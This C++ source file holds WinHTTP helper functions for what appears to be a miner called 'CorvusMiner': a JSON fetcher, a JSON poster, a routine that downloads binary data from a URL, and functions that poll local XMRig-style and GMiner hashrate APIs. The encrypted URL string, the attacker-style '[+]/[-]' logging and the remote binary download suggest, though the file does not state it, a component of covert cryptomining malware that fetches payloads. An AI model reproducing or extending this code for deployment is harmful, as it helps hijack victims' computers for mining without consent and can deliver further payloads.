#include "../include/http_client.h"
#include "../include/json.hpp"
#include "../include/encryption.h"
#include <iostream>

std::string fetchJsonFromUrl(const std::wstring& url, int useSSL) {
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        std::cerr << "Failed to parse URL." << std::endl;
        return "";
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hSession = WinHttpOpen(
        L"WinHTTP Example/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );
    if (!hSession) {
        std::cerr << "Failed to initialize WinHTTP." << std::endl;
        return "";
    }

    HINTERNET hConnect = WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to connect to host." << std::endl;
        return "";
    }

    // Determine SSL flag: use useSSL parameter if provided (1), otherwise check URL scheme
    DWORD flags = 0;
    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags = WINHTTP_FLAG_SECURE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, 
        L"GET", 
        path.empty() ? L"/" : path.c_str(),
        NULL, 
        WINHTTP_NO_REFERER, 
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to create HTTP request." << std::endl;
        return "";
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to send HTTP request." << std::endl;
        return "";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to receive HTTP response." << std::endl;
        return "";
    }

    std::string response;
    DWORD dwSize = 0;
    do {
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!dwSize) break;

        char* buffer = new char[dwSize + 1];
        DWORD dwDownloaded = 0;
        if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            buffer[dwDownloaded] = '\0';
            response += buffer;
        }
        delete[] buffer;
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return response;
}

double GetMinerHashrate() {
    std::string response = fetchJsonFromUrl(ENCRYPT_WSTR(L"http://127.0.0.1:8888/2/summary"));
    
    if (response.empty()) {
        std::cerr << "Failed to fetch miner summary." << std::endl;
        return 0.0;
    }

    try {
        auto jsonObj = nlohmann::json::parse(response);
        
        if (jsonObj.contains("hashrate") && jsonObj["hashrate"].contains("total")) {
            auto total = jsonObj["hashrate"]["total"];
            if (total.is_array() && total.size() > 0) {
                auto first = total[0];
                if (!first.is_null()) {
                    return first.get< double >();
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error parsing miner summary: " << e.what() << std::endl;
    }

    return 0.0;
}

// Get GPU miner (GMiner) hashrate from API endpoint
double GetGPUMinerHashrate() {
    std::string response = fetchJsonFromUrl(L"http://127.0.0.1:50010/stat");
    
    if (response.empty()) {
        std::cerr << "[-] Failed to fetch GMiner stats." << std::endl;
        return 0.0;
    }

    try {
        auto jsonObj = nlohmann::json::parse(response);
        
        // Extract pool_speed from GMiner API response
        if (jsonObj.contains("pool_speed")) {
            auto speed = jsonObj["pool_speed"];
            if (speed.is_number()) {
                double hashrate = speed.get<double>();
#ifdef _DEBUG
                std::cout << "[+] GMiner pool_speed: " << hashrate << " H/s" << std::endl;
#endif
                return hashrate;
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "[-] Error parsing GMiner stats: " << e.what() << std::endl;
    }

    return 0.0;
}

// Download binary data from URL
BYTE* downloadBinaryFromUrl(const std::wstring& url, size_t& outSize, int useSSL) {
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        std::cerr << "[-] Failed to parse URL for binary download." << std::endl;
        outSize = 0;
        return nullptr;
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hSession = WinHttpOpen(
        L"CorvusMiner/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );
    if (!hSession) {
        std::cerr << "[-] Failed to initialize WinHTTP for binary download." << std::endl;
        outSize = 0;
        return nullptr;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        std::cerr << "[-] Failed to connect to host for binary download." << std::endl;
        outSize = 0;
        return nullptr;
    }

    // Determine SSL flag
    DWORD flags = 0;
    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags = WINHTTP_FLAG_SECURE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, 
        L"GET", 
        path.empty() ? L"/" : path.c_str(),
        NULL, 
        WINHTTP_NO_REFERER, 
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "[-] Failed to create HTTP request for binary download." << std::endl;
        outSize = 0;
        return nullptr;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "[-] Failed to send HTTP request for binary download." << std::endl;
        outSize = 0;
        return nullptr;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "[-] Failed to receive HTTP response for binary download." << std::endl;
        outSize = 0;
        return nullptr;
    }

    // Allocate buffer for binary data
    std::vector<BYTE> buffer;
    DWORD dwSize = 0;
    
    do {
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!dwSize) break;

        BYTE* tempBuffer = new BYTE[dwSize];
        DWORD dwDownloaded = 0;
        if (WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded)) {
            buffer.insert(buffer.end(), tempBuffer, tempBuffer + dwDownloaded);
        }
        delete[] tempBuffer;
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (buffer.empty()) {
        std::cerr << "[-] Downloaded binary data is empty." << std::endl;
        outSize = 0;
        return nullptr;
    }

    // Copy to heap-allocated buffer
    outSize = buffer.size();
    BYTE* result = new BYTE[outSize];
    memcpy(result, buffer.data(), outSize);

    return result;
}

std::string postJsonToUrl(const std::wstring& url, const std::string& jsonData, int useSSL) {
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        std::cerr << "Failed to parse URL." << std::endl;
        return "";
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hSession = WinHttpOpen(
        L"CorvusMiner/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );
    if (!hSession) {
        std::cerr << "Failed to initialize WinHTTP." << std::endl;
        return "";
    }

    HINTERNET hConnect = WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to connect to host." << std::endl;
        return "";
    }

    // Determine SSL flag: use useSSL parameter if provided (1), otherwise check URL scheme
    DWORD flags = 0;
    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags = WINHTTP_FLAG_SECURE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, 
        L"POST", 
        path.empty() ? L"/" : path.c_str(),
        NULL, 
        WINHTTP_NO_REFERER, 
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to create HTTP request." << std::endl;
        return "";
    }

    // Set Content-Type header
    std::wstring contentType = L"Content-Type: application/json";
    if (!WinHttpAddRequestHeaders(hRequest, contentType.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to add request headers." << std::endl;
        return "";
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, (void*)jsonData.c_str(), (DWORD)jsonData.length(), (DWORD)jsonData.length(), 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to send HTTP request." << std::endl;
        return "";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        std::cerr << "Failed to receive HTTP response." << std::endl;
        return "";
    }

    std::string response;
    DWORD dwSize = 0;
    do {
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!dwSize) break;

        char* buffer = new char[dwSize + 1];
        DWORD dwDownloaded = 0;
        if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            buffer[dwDownloaded] = '\0';
            response += buffer;
        }
        delete[] buffer;
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return response;
}